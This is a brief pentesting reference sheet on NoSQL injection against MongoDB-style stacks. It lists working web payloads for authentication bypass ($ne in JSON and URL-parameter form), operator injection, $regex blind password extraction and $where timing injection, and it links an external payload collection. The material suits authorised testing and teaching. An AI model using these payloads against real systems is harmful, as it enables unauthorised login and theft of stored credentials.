# NoSQL Injection Payloads

## Overview
NoSQL injection occurs when user-controlled input is incorporated into NoSQL database queries without proper sanitization, allowing query manipulation, authentication bypass, or data extraction.

## Methodology

### 1. Identify Targets
- Node.js + MongoDB is the most common vulnerable stack
- Look for JSON APIs, Express.js applications
- Test both `application/json` body and URL parameter injection

### 2. Detection Approach

| Technique | Payload Pattern | Indicator |
|-----------|----------------|-----------|
| **Operator injection** | `{"field": {"$gt": ""}}` | Returns data that shouldn't match |
| **Auth bypass** | `{"password": {"$ne": "wrong"}}` | Login succeeds with wrong password |
| **Regex extraction** | `{"password": {"$regex": "^a"}}` | Response differs based on first char |
| **$where injection** | `{"$where": "sleep(5000)"}` | Time delay confirms execution |

### 3. Testing Patterns
- JSON body: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
- URL params: `?username[$gt]=&password[$gt]=`
- Type juggling: Send boolean/integer/null instead of string

## Payload Reference

> Full curated payload lists: [PayloadAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

For local curated payloads, see `local-payloads/nosqli.md`.

## Context Notes
- **$regex blind extraction** is the primary data extraction technique — automate for long values
- **Test both JSON and URL-encoded** — different parsers handle operators differently
- **Content-Type switching** between `application/json` and `application/x-www-form-urlencoded` may yield different results
